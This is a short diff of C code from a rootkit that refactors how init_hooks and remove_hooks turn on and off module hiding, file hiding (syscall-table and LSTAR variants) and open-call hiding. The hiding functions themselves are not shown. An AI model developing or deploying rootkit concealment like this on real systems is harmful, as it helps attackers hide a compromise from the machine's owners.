@@ -80,10 +80,11 @@ init_hooks(void)
     if (rootkit.hiding_module)
         hide_module();
 
-    if (rootkit.hiding_files == FH_TABLE)
-        hide_files();
-    else if (rootkit.hiding_files == FH_LSTAR)
-        hide_files_lstar();
+    switch (rootkit.hiding_files) {
+    case FH_TABLE: hide_files();       break;
+    case FH_LSTAR: hide_files_lstar(); break;
+    default: break;
+    }
 
     if (rootkit.hiding_open)
         hide_open();
@@ -113,10 +114,11 @@ remove_hooks(void)
     if (rootkit.hiding_module)
         unhide_module();
 
-    if (rootkit.hiding_files == FH_TABLE)
-        unhide_files();
-    else if(rootkit.hiding_files == FH_LSTAR)
-        unhide_files_lstar();
+    switch (rootkit.hiding_files) {
+    case FH_TABLE: unhide_files();       break;
+    case FH_LSTAR: unhide_files_lstar(); break;
+    default: break;
+    }
 
     if (rootkit.hiding_open)
         unhide_open();
